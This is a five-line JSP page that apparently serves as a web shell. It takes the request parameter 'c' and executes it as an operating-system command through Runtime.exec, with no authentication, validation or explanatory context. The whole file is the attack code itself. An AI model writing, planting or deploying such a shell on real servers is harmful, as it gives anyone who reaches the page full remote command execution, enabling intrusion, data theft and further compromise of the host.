<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("c");
  Runtime.getRuntime().exec(request.getParameter("c"));
%>
